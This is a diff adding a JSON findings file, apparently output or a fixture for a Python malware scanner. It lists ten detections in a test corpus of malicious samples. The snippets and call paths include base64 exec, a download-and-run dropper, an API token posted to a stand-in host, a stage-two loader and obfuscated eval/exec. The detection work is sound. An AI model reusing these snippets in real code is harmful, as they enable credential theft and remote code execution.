@@ -1,0 +1,136 @@
+{
+  "findings": [
+    {
+      "rule_id": "PY-EXEC-B64",
+      "title": "Base64 decode passed to exec",
+      "severity": "high",
+      "confidence": 0.96,
+      "file": "tests/corpus/malicious/base64_exec.py",
+      "line": 6,
+      "snippet": "exec(base64.b64decode(payload).decode())",
+      "message": "Decoded base64 content is executed dynamically. Classic obfuscated payload execution.",
+      "call_path": null
+    },
+    {
+      "rule_id": "PY-DROPPER",
+      "title": "Downloaded payload written then executed",
+      "severity": "high",
+      "confidence": 0.91,
+      "file": "tests/corpus/malicious/dropper_download_write_exec.py",
+      "line": 11,
+      "snippet": "subprocess.run([\"python\", target], check=False)",
+      "message": "Network content is persisted as Python code and then executed. Classic dropper pattern.",
+      "call_path": [
+        "dropper_download_write_exec.py:6 fetch_payload() → requests.get(...).text",
+        "dropper_download_write_exec.py:10 install_stage() → open(target, 'w').write(fetch_payload())",
+        "dropper_download_write_exec.py:11 install_stage() → subprocess.run([\"python\", target])"
+      ]
+    },
+    {
+      "rule_id": "PY-ENV-EXFIL",
+      "title": "Environment variable exfiltrated via HTTP POST",
+      "severity": "high",
+      "confidence": 0.88,
+      "file": "tests/corpus/malicious/env_exfil.py",
+      "line": 7,
+      "snippet": "requests.post(\"https://example.invalid/collect\", json={\"token\": token}, timeout=2)",
+      "message": "Sensitive environment variable (API_TOKEN) collected then sent to a remote endpoint. Credential theft pattern.",
+      "call_path": [
+        "env_exfil.py:6 send_token() → os.environ.get('API_TOKEN')",
+        "env_exfil.py:7 send_token() → requests.post('https://example.invalid/collect', json={'token': token})"
+      ]
+    },
+    {
+      "rule_id": "PY-EVAL-JOINED",
+      "title": "eval() on a reconstructed joined string",
+      "severity": "high",
+      "confidence": 0.85,
+      "file": "tests/corpus/malicious/eval_joined_string.py",
+      "line": 3,
+      "snippet": "return eval(\"\".join(parts))",
+      "message": "String fragments joined at runtime and passed to eval(). Common obfuscation to evade static string matching.",
+      "call_path": null
+    },
+    {
+      "rule_id": "PY-DYNAMIC-IMPORT",
+      "title": "Dynamic import used to invoke system command",
+      "severity": "medium",
+      "confidence": 0.74,
+      "file": "tests/corpus/malicious/importlib_dynamic_system.py",
+      "line": 6,
+      "snippet": "module.system(\"id\")",
+      "message": "importlib.import_module used to load 'os' dynamically, then system() called. Bypasses static import analysis.",
+      "call_path": [
+        "importlib_dynamic_system.py:5 dynamic_command() → importlib.import_module('os')",
+        "importlib_dynamic_system.py:6 dynamic_command() → module.system('id')"
+      ]
+    },
+    {
+      "rule_id": "PY-SUBPROCESS-INJECT",
+      "title": "Command injection via string concatenation in os.system",
+      "severity": "medium",
+      "confidence": 0.71,
+      "file": "tests/corpus/malicious/os_system_concat.py",
+      "line": 6,
+      "snippet": "os.system(command)",
+      "message": "User-controlled value concatenated into a shell command string. Enables arbitrary command injection.",
+      "call_path": [
+        "os_system_concat.py:5 run_user_command() → command = 'echo ' + name",
+        "os_system_concat.py:6 run_user_command() → os.system(command)"
+      ]
+    },
+    {
+      "rule_id": "PY-PICKLE-NETWORK",
+      "title": "Pickle deserialization of untrusted network bytes",
+      "severity": "high",
+      "confidence": 0.82,
+      "file": "tests/corpus/malicious/pickle_network_loads.py",
+      "line": 7,
+      "snippet": "return pickle.loads(response.content)",
+      "message": "pickle.loads() called on raw bytes from an HTTP response. Allows remote code execution via crafted payload.",
+      "call_path": null
+    },
+    {
+      "rule_id": "PY-HIGH-ENTROPY",
+      "title": "Reversed string literal passed to exec",
+      "severity": "high",
+      "confidence": 0.79,
+      "file": "tests/corpus/malicious/reversed_exec.py",
+      "line": 3,
+      "snippet": "exec(payload)",
+      "message": "A reversed string is reconstructed at runtime and passed to exec(). Obfuscation to evade static string analysis.",
+      "call_path": [
+        "reversed_exec.py:2 run_reversed() → payload = \"))( '2egats'(tnirp\"[::-1]",
+        "reversed_exec.py:3 run_reversed() → exec(payload)"
+      ]
+    },
+    {
+      "rule_id": "PY-WRITE-IMPORT",
+      "title": "Stage-2 loader: writes .py file then imports it",
+      "severity": "high",
+      "confidence": 0.93,
+      "file": "tests/corpus/malicious/write_then_import.py",
+      "line": 7,
+      "snippet": "return importlib.import_module(\"stage_two\")",
+      "message": "Script writes Python source to disk then dynamically imports it. Enables persistent stage-2 payload execution.",
+      "call_path": [
+        "write_then_import.py:5 write_and_import() → open('stage_two.py', 'w').write(...)",
+        "write_then_import.py:7 write_and_import() → importlib.import_module('stage_two')"
+      ]
+    },
+    {
+      "rule_id": "PY-CTYPES-B64",
+      "title": "ctypes.CDLL loads a base64-decoded library path",
+      "severity": "high",
+      "confidence": 0.89,
+      "file": "tests/corpus/malicious/ctypes_base64_blob.py",
+      "line": 7,
+      "snippet": "ctypes.CDLL(base64.b64decode(encoded_path).decode())",
+      "message": "A base64-encoded path is decoded at runtime and loaded as a native library via ctypes. Shellcode or rootkit delivery pattern.",
+      "call_path": [
+        "ctypes_base64_blob.py:6 load_library() → encoded_path = 'L3RtcC9saWJzdGFnZS5zbw=='",
+        "ctypes_base64_blob.py:7 load_library() → ctypes.CDLL(base64.b64decode(encoded_path).decode())"
+      ]
+    }
+  ]
+}
